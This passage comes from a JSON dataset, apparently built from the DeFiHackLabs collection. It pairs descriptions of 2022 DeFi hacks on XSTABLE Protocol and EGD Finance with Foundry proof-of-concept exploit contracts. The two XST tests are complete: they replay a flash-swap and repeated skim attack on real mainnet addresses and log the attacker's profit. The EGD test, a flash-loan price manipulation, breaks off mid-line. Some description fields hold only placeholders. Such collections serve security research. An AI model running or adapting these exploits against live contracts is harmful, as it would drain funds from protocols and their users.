swapExactETHForTokensSupportingFeeOnTransferTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable;\n\n  function swapExactTokensForETH(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForETHSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapExactTokensForTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapTokensForExactETH(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapTokensForExactTokens(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n  // receive () external payable;\n}\n",
                        "token_count": 1172,
                        "imported": true
                    }
                ]
            }
        ]
    },
    {
        "id": "47424ee30a",
        "is_ready": false,
        "content": "### 20220810 XSTABLE Protocol - Incorrect Logic Check\n#### Contract\n[XST.exp.sol](src/test/XST.exp.sol)\n[XST02_exp.sol](src/test/XST02_exp.sol)\n#### Link reference\nhttps://mobile.twitter.com/BlockSecTeam/status/1557195012042936320",
        "date": "20220810",
        "target": "XSTABLE Protocol",
        "attack_title": "Incorrect Logic Check",
        "vuln_desc": "A description of the exposed vulnerability.",
        "poc_explain": "An explaination of how the poc exposes the vulnerability.",
        "lost_value": null,
        "github_path": "https://github.com/SunWeb3Sec/DeFiHackLabs/",
        "reference_links": [
            {
                "link": "https://mobile.twitter.com/BlockSecTeam/status/1557195012042936320",
                "content": "content of the link"
            }
        ],
        "data": [
            {
                "contract_path": "src/test/XST.exp.sol",
                "testcase": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n// Pool1: UniswapV2 WETH/USDT\n// Pool2: UniswapV2 WETH/XST\ncontract XSTExpTest is Test {\n    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address constant UniswapV20x694f = 0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C;\n    address constant XST = 0x91383A15C391c142b80045D8b4730C1c37ac0378;\n    address constant XStable2 = 0xb276647E70CB3b81a1cA302Cf8DE280fF0cE5799;\n    address constant UniswapV20x0d4a = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;\n    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;\n    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    function setUp() public {\n        cheat.createSelectFork(\"mainnet\", 15310016);\n    }\n    function testExploit() public {\n        uint256 balance = IERC20(WETH).balanceOf(UniswapV20x694f);\n        IUniswapV2Pair(UniswapV20x0d4a).swap(balance * 2, 0, address(this), \"0000\");\n        uint256 WETHBalance = IERC20(WETH).balanceOf(address(this));\n        console.log(\"now my weth num: %s\", WETHBalance / 1e18);\n        IERC20(WETH).withdraw(WETHBalance);\n    }\n    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        if (keccak256(data) == keccak256(\"0000\")) {\n            uint256 balance = IERC20(WETH).balanceOf(address(this));\n            IERC20(WETH).transfer(UniswapV20x694f, balance);\n            uint256 uniswapETHBalance = IERC20(WETH).balanceOf(UniswapV20x694f);\n            (uint256 amount0Out, uint256 amount1Out,) = Uni_Pair_V2(UniswapV20x694f).getReserves();\n            console.log(\"Reserve amount %s\", amount0Out);\n            uint256 borrowXST = amount0Out * balance / uniswapETHBalance;\n            console.log(\"Swap xst %s\", borrowXST);\n            Uni_Pair_V2(UniswapV20x694f).swap(borrowXST, 0, address(this), \"00\");\n            Uni_Pair_V2(UniswapV20x694f).sync();\n            uint256 b1 = IERC20(XST).balanceOf(address(this));\n            uint256 b2 = IERC20(XST).balanceOf(UniswapV20x694f);\n            console.log(\"My xst balance: %s, uniswp xst: %s\", b1, b2);\n            IERC20(XST).transfer(UniswapV20x694f, b1 / 8);\n            for (uint8 i = 0; i < 15; ++i) {\n                Uni_Pair_V2(UniswapV20x694f).skim(UniswapV20x694f);\n            }\n            Refund(amount0);\n        } else {\n            // do nothing\n        }\n    }\n    function Refund(uint256 amount) internal  {\n        Uni_Pair_V2(UniswapV20x694f).skim(address(this));\n        uint256 nowXSTBalance = IERC20(XST).balanceOf(address(this));\n        IERC20(XST).transfer(UniswapV20x694f, nowXSTBalance);\n        (uint256 a0Out, uint256 a1Out,) = Uni_Pair_V2(UniswapV20x694f).getReserves();\n        uint256 swapAmount = a1Out * 9 / 10;\n        Uni_Pair_V2(UniswapV20x694f).swap(0, swapAmount, address(this), \"00\");\n        uint256 nowWETHBalance = IERC20(WETH).balanceOf(address(this));\n        console.log(\"my weth balance: %s\", nowWETHBalance);\n        uint256 v = amount;\n        uint256 fee = v * 4 / 1e3;\n        uint256 refund = v + fee;\n        console.log(\"Refund %s:\", refund);\n        IERC20(WETH).transfer(UniswapV20x0d4a, refund);\n    }\n    fallback() external payable { }\n}",
                "token_count": 1117,
                "interfaces": [
                    {
                        "name": "CheatCodes",
                        "content": "interface CheatCodes {\n  // This allows us to getRecordedLogs()\n  struct Log {bytes32[] topics; bytes data;}\n  // Set block.timestamp (newTimestamp)\n  function warp(uint256) external;\n  // Set block.height (newHeight)\n  function roll(uint256) external;\n  // Set block.basefee (newBasefee)\n  function fee(uint256) external;\n  // Set block.coinbase (who)\n  function coinbase(address) external;\n  // Loads a storage slot from an address (who, slot)\n  function load(address,bytes32) external returns (bytes32);\n  // Stores a value to an address' storage slot, (who, slot, value)\n  function store(address,bytes32,bytes32) external;\n  // Signs data, (privateKey, digest) => (v, r, s)\n  function sign(uint256,bytes32) external returns (uint8,bytes32,bytes32);\n  // Gets address for a given private key, (privateKey) => (address)\n  function addr(uint256) external returns (address);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\n  function deriveKey(string calldata, uint32) external returns (uint256);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}\n  function deriveKey(string calldata, string calldata, uint32) external returns (uint256);\n  // Performs a foreign function call via terminal, (stringInputs) => (result)\n  function ffi(string[] calldata) external returns (bytes memory);\n  // Set environment variables, (name, value)\n  function setEnv(string calldata, string calldata) external;\n  // Read environment variables, (name) => (value)\n  function envBool(string calldata) external returns (bool);\n  function envUint(string calldata) external returns (uint256);\n  function envInt(string calldata) external returns (int256);\n  function envAddress(string calldata) external returns (address);\n  function envBytes32(string calldata) external returns (bytes32);\n  function envString(string calldata) external returns (string memory);\n  function envBytes(string calldata) external returns (bytes memory);\n  // Read environment variables as arrays, (name, delim) => (value[])\n  function envBool(string calldata, string calldata) external returns (bool[] memory);\n  function envUint(string calldata, string calldata) external returns (uint256[] memory);\n  function envInt(string calldata, string calldata) external returns (int256[] memory);\n  function envAddress(string calldata, string calldata) external returns (address[] memory);\n  function envBytes32(string calldata, string calldata) external returns (bytes32[] memory);\n  function envString(string calldata, string calldata) external returns (string[] memory);\n  function envBytes(string calldata, string calldata) external returns (bytes[] memory);\n  // Sets the *next* call's msg.sender to be the input address\n  function prank(address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\n  function startPrank(address) external;\n  // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\n  function prank(address,address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\n  function startPrank(address,address) external;\n  // Resets subsequent calls' msg.sender to be `address(this)`\n  function stopPrank() external;\n  // Sets an address' balance, (who, newBalance)\n  function deal(address, uint256) external;\n  // Sets an address' code, (who, newCode)\n  function etch(address, bytes calldata) external;\n  // Expects an error on next call\n  function expectRevert() external;\n  function expectRevert(bytes calldata) external;\n  function expectRevert(bytes4) external;\n  // Record all storage reads and writes\n  function record() external;\n  // Gets all accessed reads and write slot from a recording session, for a given address\n  function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);\n  // Record all the transaction logs\n  function recordLogs() external;\n  // Gets all the recorded logs\n  function getRecordedLogs() external returns (Log[] memory);\n  // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\n  // Call this function, then emit an event, then call a function. Internally after the call, we check if\n  // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).\n  // Second form also checks supplied address against emitting contract.\n  function expectEmit(bool,bool,bool,bool) external;\n  function expectEmit(bool,bool,bool,bool,address) external;\n  // Mocks a call to an address, returning specified data.\n  // Calldata can either be strict or a partial match, e.g. if you only\n  // pass a Solidity selector to the expected calldata, then the entire Solidity\n  // function will be mocked.\n  function mockCall(address,bytes calldata,bytes calldata) external;\n  // Mocks a call to an address with a specific msg.value, returning specified data.\n  // Calldata match takes precedence over msg.value in case of ambiguity.\n  function mockCall(address,uint256,bytes calldata,bytes calldata) external;\n  // Clears all mocked calls\n  function clearMockedCalls() external;\n  // Expect a call to an address with the specified calldata.\n  // Calldata can either be strict or a partial match\n  function expectCall(address,bytes calldata) external;\n  // Expect a call to an address with the specified msg.value and calldata\n  function expectCall(address,uint256,bytes calldata) external;\n  // Gets the code from an artifact file. Takes in the relative path to the json file\n  function getCode(string calldata) external returns (bytes memory);\n  // Labels an address in call traces\n  function label(address, string calldata) external;\n  // If the condition is false, discard this run's fuzz inputs and generate new ones\n  function assume(bool) external;\n  // Set nonce for an account\n  function setNonce(address,uint64) external;\n  // Get nonce for an account\n  function getNonce(address) external returns(uint64);\n  // Set block.chainid (newChainId)\n  function chainId(uint256) external;\n  // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\n  function broadcast() external;\n  // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\n  function broadcast(address) external;\n  // Using the address that calls the test contract, has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast() external;\n  // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast(address) external;\n  // Stops collecting onchain transactions\n  function stopBroadcast() external;\n  // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)\n  function readFile(string calldata) external returns (string memory);\n  // Reads next line of file to string, (path) => (line)\n  function readLine(string calldata) external returns (string memory);\n  // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\n  // Path is relative to the project root. (path, data) => ()\n  function writeFile(string calldata, string calldata) external;\n  // Writes line to file, creating a file if it does not exist.\n  // Path is relative to the project root. (path, data) => ()\n  function writeLine(string calldata, string calldata) external;\n  // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\n  // Path is relative to the project root. (path) => ()\n  function closeFile(string calldata) external;\n  // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\n  // - Path points to a directory.\n  // - The file doesn't exist.\n  // - The user lacks permissions to remove the file.\n  // Path is relative to the project root. (path) => ()\n  function removeFile(string calldata) external;\n\n  function toString(address)        external returns(string memory);\n  function toString(bytes calldata) external returns(string memory);\n  function toString(bytes32)        external returns(string memory);\n  function toString(bool)           external returns(string memory);\n  function toString(uint256)        external returns(string memory);\n  function toString(int256)         external returns(string memory);\n  // Snapshot the current state of the evm.\n  // Returns the id of the snapshot that was created.\n  // To revert a snapshot use `revertTo`\n  function snapshot() external returns(uint256);\n  // Revert the state of the evm to a previous snapshot\n  // Takes the snapshot id to revert to.\n  // This deletes the snapshot and all snapshots taken after the given snapshot id.\n  function revertTo(uint256) external returns(bool);\n  // Creates a new fork with the given endpoint and block and returns the identifier of the fork\n  function createFork(string calldata,uint256) external returns(uint256);\n  // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\n  function createFork(string calldata) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\n  function createSelectFork(string calldata,uint256) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\n  function createSelectFork(string calldata) external returns(uint256);\n  // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\n  function selectFork(uint256) external;\n  /// Returns the currently active fork\n  /// Reverts if no fork is currently active\n  function activeFork() external returns(uint256);\n  // Updates the currently active fork to given block number\n  // This is similar to `roll` but for the currently active fork\n  function rollFork(uint256) external;\n  // Updates the given fork to given block number\n  function rollFork(uint256 forkId, uint256 blockNumber) external;\n  /// Returns the RPC url for the given alias\n  function rpcUrl(string calldata) external returns(string memory);\n  /// Returns all rpc urls and their aliases `[alias, url][]`\n  function rpcUrls() external returns(string[2][] memory);\n  function makePersistent(address account) external;\n}\n",
                        "token_count": 2438,
                        "imported": true
                    }
                ]
            },
            {
                "contract_path": "src/test/XST02_exp.sol",
                "testcase": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n// Pool1: UniswapV2 WETH/USDT\n// Pool2: UniswapV2 WETH/XST\ncontract ContractTest is DSTest{\n    IERC20 XST = IERC20(0x91383A15C391c142b80045D8b4730C1c37ac0378);\n    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    Uni_Pair_V2 Pair1 = Uni_Pair_V2(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852); // WETH USDT\n    Uni_Pair_V2 Pair2 = Uni_Pair_V2(0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C); // WETH XST\n    uint amount;\n    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    function setUp() public {\n        cheat.createSelectFork(\"mainnet\", 15310016);\n    }\n    function testExploit() public{\n        emit log_named_decimal_uint(\"Attacker WETH profit before exploit\",\n            WETH.balanceOf(address(this)),\n            18);\n        amount = WETH.balanceOf(address(Pair2));\n        Pair1.swap(amount * 2, 0, address(this), new bytes(1));\n        emit log_named_decimal_uint(\"Attacker WETH profit after exploit\",\n            WETH.balanceOf(address(this)),\n            18);\n    }\n    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        // swap WETH to XST\n        uint amountSellWETH = WETH.balanceOf(address(this));\n        (uint reserve0, uint reserve1,) = Pair2.getReserves(); // r0 : XST r1 WETH\n        uint amountOutXST = amountSellWETH * 997 * reserve0 / (reserve1 * 1000 + amountSellWETH * 997);\n        WETH.transfer(address(Pair2), amountSellWETH);\n        Pair2.swap(amountOutXST, 0, address(this), \"\");\n        //XST skim\n        XST.transfer(address(Pair2), XST.balanceOf(address(this)) / 8);\n        for(int i = 0; i < 15; i++){\n            Pair2.skim(address(Pair2));\n        }\n        Pair2.skim(address(this));\n        // sell XST to WETH\n        // XST is SupportFeeOn Token\n        XST.transfer(address(Pair2), XST.balanceOf(address(this)));\n        uint balanceOfXST = XST.balanceOf(address(Pair2));\n        (uint reserve3, uint reserve4,) = Pair2.getReserves(); // r3 : XST r4 WETH\n        uint amountSellXST = balanceOfXST - reserve3;\n        uint amountOutWETH = amountSellXST * 997 * reserve4 / (reserve3 * 1000 + amountSellXST * 997);      \n        Pair2.swap(0, amountOutWETH, address(this), \"\");\n        // repay falshswap\n        WETH.balanceOf(address(this));\n        WETH.transfer(address(Pair1), (amount * 2) * 1000 / 997 + 1000);\n    }\n}",
                "token_count": 798,
                "interfaces": [
                    {
                        "name": "CheatCodes",
                        "content": "interface CheatCodes {\n  // This allows us to getRecordedLogs()\n  struct Log {bytes32[] topics; bytes data;}\n  // Set block.timestamp (newTimestamp)\n  function warp(uint256) external;\n  // Set block.height (newHeight)\n  function roll(uint256) external;\n  // Set block.basefee (newBasefee)\n  function fee(uint256) external;\n  // Set block.coinbase (who)\n  function coinbase(address) external;\n  // Loads a storage slot from an address (who, slot)\n  function load(address,bytes32) external returns (bytes32);\n  // Stores a value to an address' storage slot, (who, slot, value)\n  function store(address,bytes32,bytes32) external;\n  // Signs data, (privateKey, digest) => (v, r, s)\n  function sign(uint256,bytes32) external returns (uint8,bytes32,bytes32);\n  // Gets address for a given private key, (privateKey) => (address)\n  function addr(uint256) external returns (address);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\n  function deriveKey(string calldata, uint32) external returns (uint256);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}\n  function deriveKey(string calldata, string calldata, uint32) external returns (uint256);\n  // Performs a foreign function call via terminal, (stringInputs) => (result)\n  function ffi(string[] calldata) external returns (bytes memory);\n  // Set environment variables, (name, value)\n  function setEnv(string calldata, string calldata) external;\n  // Read environment variables, (name) => (value)\n  function envBool(string calldata) external returns (bool);\n  function envUint(string calldata) external returns (uint256);\n  function envInt(string calldata) external returns (int256);\n  function envAddress(string calldata) external returns (address);\n  function envBytes32(string calldata) external returns (bytes32);\n  function envString(string calldata) external returns (string memory);\n  function envBytes(string calldata) external returns (bytes memory);\n  // Read environment variables as arrays, (name, delim) => (value[])\n  function envBool(string calldata, string calldata) external returns (bool[] memory);\n  function envUint(string calldata, string calldata) external returns (uint256[] memory);\n  function envInt(string calldata, string calldata) external returns (int256[] memory);\n  function envAddress(string calldata, string calldata) external returns (address[] memory);\n  function envBytes32(string calldata, string calldata) external returns (bytes32[] memory);\n  function envString(string calldata, string calldata) external returns (string[] memory);\n  function envBytes(string calldata, string calldata) external returns (bytes[] memory);\n  // Sets the *next* call's msg.sender to be the input address\n  function prank(address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\n  function startPrank(address) external;\n  // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\n  function prank(address,address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\n  function startPrank(address,address) external;\n  // Resets subsequent calls' msg.sender to be `address(this)`\n  function stopPrank() external;\n  // Sets an address' balance, (who, newBalance)\n  function deal(address, uint256) external;\n  // Sets an address' code, (who, newCode)\n  function etch(address, bytes calldata) external;\n  // Expects an error on next call\n  function expectRevert() external;\n  function expectRevert(bytes calldata) external;\n  function expectRevert(bytes4) external;\n  // Record all storage reads and writes\n  function record() external;\n  // Gets all accessed reads and write slot from a recording session, for a given address\n  function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);\n  // Record all the transaction logs\n  function recordLogs() external;\n  // Gets all the recorded logs\n  function getRecordedLogs() external returns (Log[] memory);\n  // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\n  // Call this function, then emit an event, then call a function. Internally after the call, we check if\n  // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).\n  // Second form also checks supplied address against emitting contract.\n  function expectEmit(bool,bool,bool,bool) external;\n  function expectEmit(bool,bool,bool,bool,address) external;\n  // Mocks a call to an address, returning specified data.\n  // Calldata can either be strict or a partial match, e.g. if you only\n  // pass a Solidity selector to the expected calldata, then the entire Solidity\n  // function will be mocked.\n  function mockCall(address,bytes calldata,bytes calldata) external;\n  // Mocks a call to an address with a specific msg.value, returning specified data.\n  // Calldata match takes precedence over msg.value in case of ambiguity.\n  function mockCall(address,uint256,bytes calldata,bytes calldata) external;\n  // Clears all mocked calls\n  function clearMockedCalls() external;\n  // Expect a call to an address with the specified calldata.\n  // Calldata can either be strict or a partial match\n  function expectCall(address,bytes calldata) external;\n  // Expect a call to an address with the specified msg.value and calldata\n  function expectCall(address,uint256,bytes calldata) external;\n  // Gets the code from an artifact file. Takes in the relative path to the json file\n  function getCode(string calldata) external returns (bytes memory);\n  // Labels an address in call traces\n  function label(address, string calldata) external;\n  // If the condition is false, discard this run's fuzz inputs and generate new ones\n  function assume(bool) external;\n  // Set nonce for an account\n  function setNonce(address,uint64) external;\n  // Get nonce for an account\n  function getNonce(address) external returns(uint64);\n  // Set block.chainid (newChainId)\n  function chainId(uint256) external;\n  // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\n  function broadcast() external;\n  // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\n  function broadcast(address) external;\n  // Using the address that calls the test contract, has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast() external;\n  // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast(address) external;\n  // Stops collecting onchain transactions\n  function stopBroadcast() external;\n  // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)\n  function readFile(string calldata) external returns (string memory);\n  // Reads next line of file to string, (path) => (line)\n  function readLine(string calldata) external returns (string memory);\n  // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\n  // Path is relative to the project root. (path, data) => ()\n  function writeFile(string calldata, string calldata) external;\n  // Writes line to file, creating a file if it does not exist.\n  // Path is relative to the project root. (path, data) => ()\n  function writeLine(string calldata, string calldata) external;\n  // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\n  // Path is relative to the project root. (path) => ()\n  function closeFile(string calldata) external;\n  // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\n  // - Path points to a directory.\n  // - The file doesn't exist.\n  // - The user lacks permissions to remove the file.\n  // Path is relative to the project root. (path) => ()\n  function removeFile(string calldata) external;\n\n  function toString(address)        external returns(string memory);\n  function toString(bytes calldata) external returns(string memory);\n  function toString(bytes32)        external returns(string memory);\n  function toString(bool)           external returns(string memory);\n  function toString(uint256)        external returns(string memory);\n  function toString(int256)         external returns(string memory);\n  // Snapshot the current state of the evm.\n  // Returns the id of the snapshot that was created.\n  // To revert a snapshot use `revertTo`\n  function snapshot() external returns(uint256);\n  // Revert the state of the evm to a previous snapshot\n  // Takes the snapshot id to revert to.\n  // This deletes the snapshot and all snapshots taken after the given snapshot id.\n  function revertTo(uint256) external returns(bool);\n  // Creates a new fork with the given endpoint and block and returns the identifier of the fork\n  function createFork(string calldata,uint256) external returns(uint256);\n  // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\n  function createFork(string calldata) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\n  function createSelectFork(string calldata,uint256) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\n  function createSelectFork(string calldata) external returns(uint256);\n  // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\n  function selectFork(uint256) external;\n  /// Returns the currently active fork\n  /// Reverts if no fork is currently active\n  function activeFork() external returns(uint256);\n  // Updates the currently active fork to given block number\n  // This is similar to `roll` but for the currently active fork\n  function rollFork(uint256) external;\n  // Updates the given fork to given block number\n  function rollFork(uint256 forkId, uint256 blockNumber) external;\n  /// Returns the RPC url for the given alias\n  function rpcUrl(string calldata) external returns(string memory);\n  /// Returns all rpc urls and their aliases `[alias, url][]`\n  function rpcUrls() external returns(string[2][] memory);\n  function makePersistent(address account) external;\n}\n",
                        "token_count": 2438,
                        "imported": true
                    },
                    {
                        "name": "IERC20",
                        "content": "interface IERC20 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function name() external view returns (string memory);\n\n  function symbol() external view returns (string memory);\n\n  function decimals() external view returns (uint8);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n  function withdraw(uint256 wad) external;\n  function deposit(uint256 wad) external returns (bool);\n  function owner() external view virtual returns (address);\n}\n",
                        "token_count": 205,
                        "imported": true
                    },
                    {
                        "name": "Uni_Pair_V2",
                        "content": "interface Uni_Pair_V2 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Burn(\n    address indexed sender,\n    uint256 amount0,\n    uint256 amount1,\n    address indexed to\n  );\n  event Mint(address indexed sender, uint256 amount0, uint256 amount1);\n  event Swap(\n    address indexed sender,\n    uint256 amount0In,\n    uint256 amount1In,\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address indexed to\n  );\n  event Sync(uint112 reserve0, uint112 reserve1);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n  function MINIMUM_LIQUIDITY() external view returns (uint256);\n\n  function PERMIT_TYPEHASH() external view returns (bytes32);\n\n  function allowance(address, address) external view returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function balanceOf(address) external view returns (uint256);\n\n  function burn(address to) external returns (uint256 amount0, uint256 amount1);\n\n  function decimals() external view returns (uint8);\n\n  function factory() external view returns (address);\n\n  function getReserves()\n  external\n  view\n  returns (\n    uint112 _reserve0,\n    uint112 _reserve1,\n    uint32 _blockTimestampLast\n  );\n\n  function initialize(address _token0, address _token1) external;\n\n  function kLast() external view returns (uint256);\n\n  function mint(address to) external returns (uint256 liquidity);\n\n  function name() external view returns (string memory);\n\n  function nonces(address) external view returns (uint256);\n\n  function permit(\n    address owner,\n    address spender,\n    uint256 value,\n    uint256 deadline,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external;\n\n  function price0CumulativeLast() external view returns (uint256);\n\n  function price1CumulativeLast() external view returns (uint256);\n\n  function skim(address to) external;\n\n  function swap(\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address to,\n    bytes memory data\n  ) external;\n\n  function symbol() external view returns (string memory);\n\n  function sync() external;\n\n  function token0() external view returns (address);\n\n  function token1() external view returns (address);\n\n  function totalSupply() external view returns (uint256);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n}\n",
                        "token_count": 569,
                        "imported": true
                    }
                ]
            }
        ]
    },
    {
        "id": "540f556772",
        "is_ready": false,
        "content": "### 20220807 EGD Finance - Flashloans & Price Manipulation\n#### Lost: 36,044 USDT\n#### Contract\n[EGD-Finance.exp.sol](src/test/EGD-Finance.exp.sol)\n#### Link reference\nhttps://twitter.com/BlockSecTeam/status/1556483435388350464\nhttps://twitter.com/PeckShieldAlert/status/1556486817406283776",
        "date": "20220807",
        "target": "EGD Finance",
        "attack_title": "Flashloans & Price Manipulation",
        "vuln_desc": "A description of the exposed vulnerability.",
        "poc_explain": "An explaination of how the poc exposes the vulnerability.",
        "lost_value": null,
        "github_path": "https://github.com/SunWeb3Sec/DeFiHackLabs/",
        "reference_links": [
            {
                "link": "https://twitter.com/BlockSecTeam/status/1556483435388350464",
                "content": "content of the link"
            },
            {
                "link": "https://twitter.com/PeckShieldAlert/status/1556486817406283776",
                "content": "content of the link"
            }
        ],
        "data": [
            {
                "contract_path": "src/test/EGD-Finance.exp.sol",
                "testcase": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n// @KeyInfo - Total Lost : ~36,044 US$\n// Attacker : 0xee0221d76504aec40f63ad7e36855eebf5ea5edd\n// Attack Contract : 0xc30808d9373093fbfcec9e026457c6a9dab706a7\n// Vulnerable Contract : 0x34bd6dba456bc31c2b3393e499fa10bed32a9370 (Proxy)\n// Vulnerable Contract : 0x93c175439726797dcee24d08e4ac9164e88e7aee (Logic)\n// @Info\n// @Analysis\n// Blocksec : https://twitter.com/BlockSecTeam/status/1556483435388350464\n// PeckShield : https://twitter.com/PeckShieldAlert/status/1556486817406283776\nIPancakePair constant USDT_WBNB_LPPool = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);\nIPancakePair constant EGD_USDT_LPPool = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);\nIPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));\naddress constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;\naddress constant usdt = 0x55d398326f99059fF775485246999027B3197955;\naddress constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;\ncontract Attacker is Test {\n    function setUp() public {\n        vm.createSelectFork(\"bsc\", 20_245_522);\n        vm.label(address(USDT_WBNB_LPPool), \"USDT_WBNB_LPPool\");\n        vm.label(address(EGD_USDT_LPPool), \"EGD_USDT_LPPool\");\n        vm.label(address(pancakeRouter), \"pancakeRouter\");\n        vm.label(EGD_Finance, \"EGD_Finance\");\n        vm.label(usdt, \"USDT\");\n        vm.label(egd, \"EGD\");\n    }\n    function testExploit() public {\n        Exploit exploit = new Exploit();\n        console.log(\"--------------------  Pre-work, stake 100 USDT to EGD Finance --------------------\");\n        console.log(\"Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8\");\n        console.log(\"Attacker Stake 100 USDT to EGD Finance\");\n        exploit.stake();\n        vm.warp(1659914146); // block.timestamp = 2022-08-07 23:15:46(UTC)\n        console.log(\"-------------------------------- Start Exploit ----------------------------------\");\n        emit log_named_decimal_uint(\"[Start] Attacker USDT Balance\", IERC20(usdt).balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"[INFO] EGD/USDT Price before price manipulation\", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);\n        emit 